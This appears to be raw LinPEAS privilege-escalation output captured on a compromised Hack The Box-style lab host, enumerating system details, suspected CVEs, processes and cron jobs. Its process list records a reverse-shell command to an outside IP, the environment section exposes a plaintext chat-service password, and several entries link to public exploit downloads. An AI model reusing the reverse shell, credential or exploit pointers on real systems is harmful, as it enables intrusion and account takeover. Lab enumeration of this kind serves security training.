# Linpeas

Paper - LinPEAS Output
LinPEAS Output
./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |                                                                          
    |---------------------------------------------------------------------------|                                                                          
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |                                                                          
    |         Follow on Twitter   :     @carlospolopm                           |                                                                          
    |         Respect on HTB      :     SirBroccoli                             |                                                                          
    |---------------------------------------------------------------------------|                                                                          
    |                                 Thank you!                                |                                                                          
    \---------------------------------------------------------------------------/                                                                          
          linpeas-ng by carlospolop                                                                                                                        
                                                                                                                                                           
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                            
                                                                                                                                                           
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                   
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

grep: write error: Broken pipe
                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════                                                    
                                         ╚═══════════════════╝                                                                                             
OS: Linux version 4.18.0-348.7.1.el8_5.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 8.5.0 20210514 (Red Hat 8.5.0-4) (GCC)) #1 SMP Wed Dec 22 13:25:12 UTC 2021
User & Groups: uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
Hostname: paper
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                          
                                                                                                                                                           

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
uniq: write error: Broken pipe
uniq: write error
DONE
                                                                                                                                                           
                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════                                                     
                                        ╚════════════════════╝                                                                                             
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                              
Linux version 4.18.0-348.7.1.el8_5.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 8.5.0 20210514 (Red Hat 8.5.0-4) (GCC)) #1 SMP Wed Dec 22 13:25:12 UTC 2021
lsb_release Not Found
                                                                                                                                                           
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                 
Sudo version 1.8.29                                                                                                                                        

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-3560                                                                                                                                



╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                         
/home/dwight/.local/bin:/home/dwight/bin:/home/dwight/.local/bin:/home/dwight/bin:/home/dwight/hubot/node_modules/coffeescript/bin:node_modules/.bin:node_modules/hubot/node_modules/.bin:/usr/bin:/bin
New path exported: /home/dwight/.local/bin:/home/dwight/bin:/home/dwight/.local/bin:/home/dwight/bin:/home/dwight/hubot/node_modules/coffeescript/bin:node_modules/.bin:node_modules/hubot/node_modules/.bin:/usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin

╔══════════╣ Date & uptime
Thu Apr 21 10:02:40 EDT 2022                                                                                                                               
 10:02:40 up  2:53,  0 users,  load average: 0.79, 0.55, 0.33

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                       
sda
sda1
sda2

╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices                                                                                                                 
                                                                                                                                                           
/dev/mapper/cl-root     /                       xfs     defaults        0 0
UUID=92708911-c24f-48e2-8b9f-bb4b24f0ca24 /boot                   ext4    defaults        1 2
/dev/mapper/cl-swap     swap                    swap    defaults        0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                    
LS_COLORS=                                                                                                                                                 
RESPOND_TO_EDITED=true
ROCKETCHAT_USER=recyclops
LANG=en_US.UTF-8
OLDPWD=/home/dwight/hubot
ROCKETCHAT_URL=http://127.0.0.1:48320
ROCKETCHAT_USESSL=false
which_declare=declare -f
XDG_SESSION_ID=1
USER=dwight
RESPOND_TO_DM=true
PWD=/home/dwight/hubot
HOME=/home/dwight
XDG_DATA_DIRS=/home/dwight/.local/share/flatpak/exports/share:/var/lib/flatpak/exports/share:/usr/local/share:/usr/share
HISTFILE=/dev/null
PORT=8000
ROCKETCHAT_PASSWORD=Queenofblad3s!23
SHELL=/bin/bash
TERM=xterm
TC_LIB_DIR=/usr/lib64/tc
SHLVL=7
BIND_ADDRESS=127.0.0.1
LOGNAME=dwight
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1004/bus
XDG_RUNTIME_DIR=/run/user/1004
PATH=/home/dwight/.local/bin:/home/dwight/bin:/home/dwight/.local/bin:/home/dwight/bin:/home/dwight/hubot/node_modules/coffeescript/bin:node_modules/.bin:node_modules/hubot/node_modules/.bin:/usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin
HISTSIZE=0
HISTFILESIZE=0
LESSOPEN=||/usr/bin/lesspipe.sh %s
BASH_FUNC_which%%=() {  ( alias;
 eval ${which_declare} ) | /usr/bin/which --tty-only --read-alias --read-functions --show-tilde --show-dot "$@"
}
_=/usr/bin/env

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                                                          
dmesg Not Found                                                                                                                                            
                                                                                                                                                           
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                         
cat: write error: Broken pipe                                                                                                                              
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2019-13272] PTRACE_TRACEME

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},debian=10{kernel:4.19.0-*},fedora=30{kernel:5.0.9-*}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                    
                                                                                                                                                           
╔══════════╣ Protections
═╣ AppArmor enabled? .............. AppArmor Not Found                                                                                                     
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                   
═╣ PaX bins present? .............. PaX Not Found                                                                                                          
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                   
═╣ SELinux enabled? ............... SELinux status:                 disabled                                                                               
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                                                           

                                             ╔═══════════╗
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════                                                    
                                             ╚═══════════╝                                                                                                 
╔══════════╣ Container related tools present
/usr/bin/podman                                                                                                                                            
/usr/bin/runc
╔══════════╣ Container details
═╣ Is this a container? ........... No                                                                                                                     
═╣ Any running containers? ........ No                                                                                                                     
                                                                                                                                                           

                          ╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════                                                     
                          ╚════════════════════════════════════════════════╝                                                                               
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                     
root           1  0.0  0.4 238356  8636 ?        Ss   07:08   0:05 /usr/lib/systemd/systemd --switched-root --system --deserialize 18                      
root         857  0.0  0.5  89588  9960 ?        Ss   07:08   0:00 /usr/lib/systemd/systemd-journald
root         897  0.0  0.4 118648  7452 ?        Ss   07:08   0:00 /usr/lib/systemd/systemd-udevd
root         996  0.0  0.1 150808  2308 ?        S<sl 07:08   0:00 /sbin/auditd
root         998  0.0  0.1  48560  2028 ?        S<   07:08   0:00  _ /usr/sbin/sedispatch
root        1025  0.0  0.5 564504 10728 ?        Ssl  07:08   0:00 /usr/libexec/udisks2/udisksd
root        1027  0.0  0.2  79116  5140 ?        Ss   07:08   0:00 /usr/lib/systemd/systemd-machined
polkitd     1028  0.0  1.0 1953360 19132 ?       Ssl  07:08   0:01 /usr/lib/polkit-1/polkitd --no-debug
rtkit       1031  0.0  0.1 202852  3348 ?        SNsl 07:08   0:00 /usr/libexec/rtkit-daemon
  └─(Caps) 0x0000000000880004=cap_dac_read_search,cap_sys_ptrace,cap_sys_nice
avahi       1094  0.0  0.0  85208   428 ?        S    07:08   0:00  _ avahi-daemon: chroot helper
root        1033  0.0  0.2  50260  4692 ?        Ss   07:08   0:00 /usr/sbin/smartd -n -q never
root        1034  0.0  0.2 125020  4172 ?        Ssl  07:08   0:00 /usr/sbin/irqbalance --foreground
root        1038  0.0  0.4  86204  7500 ?        Ss   07:08   0:00 /usr/bin/VGAuthService -s
root        1039  0.0  0.5 381756  9232 ?        Ssl  07:08   0:10 /usr/bin/vmtoolsd
root        1040  0.0  0.4 219104  9136 ?        Ss   07:08   0:00 /usr/sbin/sssd -i --logger=files
root        1095  0.0  0.6 228276 11388 ?        S    07:08   0:08  _ /usr/libexec/sssd/sssd_be --domain implicit_files --uid 0 --gid 0 --logger=files
root        1115  0.0  1.4 229264 26260 ?        S    07:08   0:02  _ /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
dbus        1043  0.0  0.3  84024  5548 ?        Ss   07:08   0:04 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root        1047  0.0  0.5 463028  9280 ?        Ssl  07:08   0:00 /usr/sbin/ModemManager
libstor+    1049  0.0  0.0  19740  1812 ?        Ss   07:08   0:00 /usr/bin/lsmd -d
chrony      1063  0.0  0.2 151156  3776 ?        S    07:08   0:00 /usr/sbin/chronyd
  └─(Caps) 0x0000000002000400=cap_net_bind_service,cap_sys_time
root        1070  0.0  0.1  26244  2248 ?        S    07:08   0:00 /bin/bash /usr/sbin/ksmtuned
root       46617  0.0  0.0   7308   892 ?        S    10:01   0:00  _ sleep 60
root        1086  0.0  0.7 405040 13088 ?        Ssl  07:08   0:01 /usr/sbin/NetworkManager --no-daemon[0m
root        1127  0.2  1.4 571552 26320 ?        Ssl  07:08   0:21 /usr/libexec/platform-python -Es /usr/sbin/tuned -l -P
root        1133  0.0  0.6 217000 12284 ?        Ss   07:08   0:00 php-fpm: master process (/etc/php-fpm.conf)
apache      1220  0.0  0.5 245944  9272 ?        S    07:08   0:00  _ php-fpm: pool www
apache      1221  0.0  0.4 307536  8736 ?        S    07:08   0:00  _ php-fpm: pool www
apache      1222  0.0  0.4 317624  8712 ?        S    07:08   0:00  _ php-fpm: pool www
apache      1223  0.0  0.5 309568  9924 ?        S    07:08   0:01  _ php-fpm: pool www
apache      1224  0.0  0.4 317784  8664 ?        S    07:08   0:00  _ php-fpm: pool www
apache      3331  0.0  0.4 319812  8644 ?        S    07:23   0:00  _ php-fpm: pool www
root        1136  0.0  0.3  94472  6128 ?        Ss   07:08   0:00 /usr/sbin/sshd -D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128-cbc -oMACs=hmac-sha2-256-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha1,umac-128@openssh.com,hmac-sha2-512 -oGSSAPIKexAlgorithms=gss-curve25519-sha256-,gss-nistp256-sha256-,gss-group14-sha256-,gss-group16-sha512-,gss-gex-sha1-,gss-group14-sha1- -oKexAlgorithms=curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1 -oHostKeyAlgorithms=ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com -oPubkeyAcceptedKeyTypes=ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com -oCASignatureAlgorithms=ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed25519,rsa-sha2-256,rsa-sha2-512,ssh-rsa
root        1137  0.0  0.1 101776  2732 ?        Ssl  07:08   0:00 /usr/sbin/gssproxy -D
root        1215  0.0  0.3  92624  6016 ?        Ss   07:08   0:00 /usr/lib/systemd/systemd-logind
root        1216  0.0  0.4 331432  7428 ?        Ssl  07:08   0:00 /usr/libexec/accounts-daemon[0m
mongod      1226  0.8  3.8 1351956 70976 ?       Sl   07:08   1:30 /usr/bin/mongod -f /etc/mongod.conf
root        1293  0.0  0.5 285284 10596 ?        Ss   07:08   0:00 /usr/sbin/httpd -DFOREGROUND
apache      7319  0.0  0.3 298332  6936 ?        S    08:30   0:00  _ /usr/sbin/httpd -DFOREGROUND
apache      7320  0.0  0.3 299708  7240 ?        S    08:30   0:00  _ /usr/sbin/httpd -DFOREGROUND
apache      7321  0.0  0.8 1946824 15056 ?       Sl   08:30   0:01  _ /usr/sbin/httpd -DFOREGROUND
apache      7322  0.0  0.5 1815688 10932 ?       Sl   08:30   0:01  _ /usr/sbin/httpd -DFOREGROUND
apache      7323  0.0  0.5 1815688 10816 ?       Sl   08:30   0:01  _ /usr/sbin/httpd -DFOREGROUND
apache      7535  0.0  0.9 1815688 17076 ?       Sl   08:30   0:01  _ /usr/sbin/httpd -DFOREGROUND
root        1302  0.0  0.3 211616  7208 ?        Ssl  07:08   0:01 /usr/sbin/rsyslogd -n
root        1311  0.0  0.1  44004  2400 ?        Ss   07:08   0:00 /usr/sbin/atd -f
root        1319  0.0  0.1  36952  3260 ?        Ss   07:08   0:00 /usr/sbin/crond -n
root        1654  0.0  0.3 126088  5856 ?        S    07:08   0:00  _ /usr/sbin/CROND -n
dwight      1797  0.0  0.1  12724  2300 ?        Ss   07:08   0:00      _ /bin/sh -c /home/dwight/bot_restart.sh >> /home/dwight/hubot/.hubot.log 2>&1
dwight      1804  0.0  0.1  12724  2536 ?        S    07:08   0:00          _ /bin/bash /home/dwight/bot_restart.sh
dwight      2398  0.0  0.1  12724  2560 ?        S    07:09   0:00              _ bash /home/dwight/hubot/start_bot.sh
dwight      2400  0.0  1.1 588960 21784 ?        Sl   07:09   0:02              |   _ node /home/dwight/hubot/node_modules/coffeescript/bin/coffee /home/dwight/hubot/node_modules/.bin/hubot -a rocketchat                                                                                                           
dwight      2466  0.0  0.1  12724  2640 ?        S    07:10   0:00              _ bash /home/dwight/hubot/start_bot.sh
dwight      2468  0.0  2.2 628248 41624 ?        Sl   07:10   0:03              |   _ node /home/dwight/hubot/node_modules/coffeescript/bin/coffee /home/dwight/hubot/node_modules/.bin/hubot -a rocketchat                                                                                                           
dwight     11119  0.0  0.1  12724  2828 ?        S    09:28   0:00              |       _ /bin/sh -c /bin/bash -i >& /dev/tcp/10.10.14.10/4444 0>&1
dwight     11120  0.0  0.2  25440  4940 ?        S    09:28   0:00              |           _ /bin/bash -i
dwight     11156  0.0  0.4  45520  8772 ?        S    09:28   0:00              |               _ python3 -c import pty;pty.spawn("/bin/bash");
dwight     11157  0.0  0.2  25440  5060 pts/0    Ss   09:28   0:00              |                   _ /bin/bash
dwight     46374  0.3  0.2  14908  5396 pts/0    S+   10:01   0:00              |                       _ /bin/sh ./linpeas.sh
dwight     49344  0.0  0.2  14908  4000 pts/0    S+   10:02   0:00              |                           _ /bin/sh ./linpeas.sh
dwight     49348  0.0  0.2  59172  4848 pts/0    R+   10:02   0:00              |                           |   _ ps fauxwww
dwight     49347  0.0  0.1  14908  2528 pts/0    S+   10:02   0:00              |                           _ /bin/sh ./linpeas.sh
dwight     47559  0.0  0.0   7308   896 ?        S    10:02   0:00              _ sleep 20s
mysql       1327  0.1  2.9 1776652 54152 ?       Ssl  07:08   0:19 /usr/libexec/mysqld --basedir=/usr
  └─(Caps) 0x0000000000800000=cap_sys_nice
root        1333  0.0  0.0  13656  1532 tty1     Ss+  07:08   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
dwight      1687  0.0  0.3  89488  6720 ?        Ss   07:08   0:00 /usr/lib/systemd/systemd --user
dwight      1702  0.0  0.0 168644  1420 ?        S    07:08   0:00  _ (sd-pam)
dwight      1795  0.0  0.2 298156  5244 ?        Ssl  07:08   0:00  _ /usr/bin/pulseaudio --daemonize=no --log-target=journal
dwight      2237  0.0  0.1  76488  3360 ?        Ss   07:09   0:00  _ /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
dwight      9186  0.0  0.4 313016  7668 ?        Ssl  08:56   0:00  _ /usr/libexec/gvfsd
dwight      9191  0.0  0.4 449608  8936 ?        Sl   08:56   0:00  _ /usr/libexec/gvfsd-fuse /run/user/1004/gvfs -f -o big_writes
rocketc+    2013  0.8 24.3 2578488 446644 ?      Ssl  07:09   1:28 /usr/local/bin/node /opt/Rocket.Chat/main.js
dnsmasq     2098  0.0  0.0  73328  1424 ?        S    07:09   0:00 /usr/sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.conf --leasefile-ro --dhcp-script=/usr/libexec/libvirt_leaseshelper
  └─(Caps) 0x0000000000003400=cap_net_bind_service,cap_net_admin,cap_net_raw
root        2101  0.0  0.0  73300   412 ?        S    07:09   0:00  _ /usr/sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.conf --leasefile-ro --dhcp-script=/usr/libexec/libvirt_leaseshelper
dwight     20249  0.0  0.0 169040   428 ?        Ss   09:53   0:00 gpg-agent --homedir /home/dwight/.gnupg --use-standard-socket --daemon[0m
root       23290  0.1  2.4 627056 45020 ?        Ssl  09:53   0:00 /usr/libexec/packagekitd

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                    
                                                                                                                                                           
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                         
COMMAND     PID   TID TASKCMD             USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME                                                  

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                                                              
gdm-password Not Found                                                                                                                                     
gnome-keyring-daemon Not Found                                                                                                                             
lightdm Not Found                                                                                                                                          
vsftpd Not Found                                                                                                                                           
apache2 Not Found                                                                                                                                          
sshd Not Found                                                                                                                                             
                                                                                                                                                           
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs                                                                          
/usr/bin/crontab                                                                                                                                           
@reboot /home/dwight/bot_restart.sh >> /home/dwight/hubot/.hubot.log 2>&1
incrontab Not Found
-rw-r--r--. 1 root root   0 Nov  8  2019 /etc/cron.deny                                                                                                    
-rw-r--r--. 1 root root 451 Jan 12  2021 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x.   2 root root   39 Nov  8  2019 .
drwxr-xr-x. 145 root root 8192 Apr 21 07:08 ..
-rw-r--r--.   1 root root  128 Nov  8  2019 0hourly
-rw-r--r--.   1 root root  108 Aug  9  2021 raid-check

/etc/cron.daily:
total 16
drwxr-xr-x.   2 root root   23 May 15  2020 .
drwxr-xr-x. 145 root root 8192 Apr 21 07:08 ..
-rwxr-xr-x.   1 root root  189 Jan  4  2018 logrotate

/etc/cron.hourly:
total 16
drwxr-xr-x.   2 root root   22 Jan 14 04:49 .
drwxr-xr-x. 145 root root 8192 Apr 21 07:08 ..
-rwxr-xr-x.   1 root root  575 Nov  8  2019 0anacron

/etc/cron.monthly:
total 12
drwxr-xr-x.   2 root root    6 Jan 12  2021 .
drwxr-xr-x. 145 root root 8192 Apr 21 07:08 ..

/etc/cron.weekly:
total 12
drwxr-xr-x.   2 root root    6 Jan 12  2021 .
drwxr-xr-x. 145 root root 8192 Apr 21 07:08 ..

/var/spool/anacron:
total 12
drwxr-xr-x. 2 root root 63 Nov  8  2019 .
drwxr-xr-x. 9 root root 97 Jun 22  2021 ..
-rw-------. 1 root root  9 Apr 21 08:30 cron.daily
-rw-------. 1 root root  9 Apr 21 09:10 cron.monthly
-rw-------. 1 root root  9 Apr 21 08:50 cron.weekly
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root






SHELL=/bin/sh
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
RANDOM_DELAY=45
START_HOURS_RANGE=3-22

1       5       cron.daily              nice run-parts /etc/cron.daily
7       25      cron.weekly             nice run-parts /etc/cron.weekly
@monthly 45     cron.monthly            nice run-parts /etc/cron.monthly

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths                                                                  
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin                                                                                                     

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#services                                                                                     
/etc/systemd/system/sysinit.target.wants/iscsi.service is executing some relative path                                                                     
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                       
NEXT                         LEFT       LAST                         PASSED       UNIT                         ACTIVATES                                   
Thu 2022-04-21 10:34:56 EDT  31min left Thu 2022-04-21 09:18:45 EDT  45min ago    dnf-makecache.timer          dnf-makecache.service
Fri 2022-04-22 00:00:00 EDT  13h left   n/a                          n/a          unbound-anchor.timer         unbound-anchor.service
Fri 2022-04-22 07:23:47 EDT  21h left   Thu 2022-04-21 07:23:47 EDT  2h 40min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                       
                                                                                                                                                           
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                                                                      
/etc/systemd/system/sockets.target.wants/avahi-daemon.socket is calling this writable listener: /run/avahi-daemon/socket                                   

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                                                                      
/etc/httpd/run/cgisock.1293                                                                                                                                
/home/dwight/hubot/127.0.0.1:8000
  └─(Read Write)
/home/dwight/hubot/127.0.0.1:8080
  └─(Read Write)
/org/kernel/linux/storage/multipathd
/run/avahi-daemon/socket
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/gssproxy.sock
  └─(Read Write)
/run/.heim_org.h5l.kcm-socket
  └─(Read Write)
/run/libvirt/libvirt-admin-sock
/run/libvirt/libvirt-sock
  └─(Read Write)
/run/libvirt/libvirt-sock-ro
  └─(Read Write)
/run/libvirt/virtlockd-sock
/run/libvirt/virtlogd-sock
/run/lsm/ipc/sim
  └─(Read Write)
/run/lsm/ipc/simc
  └─(Read Write)
/run/lvm/lvmpolld.socket
/run/php-fpm/www.sock
/run/systemd/cgroups-agent
/run/systemd/coredump
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/1004/bus
  └─(Read Write)
/run/user/1004/gnupg/S.gpg-agent
  └─(Read Write)
/run/user/1004/gnupg/S.gpg-agent.browser
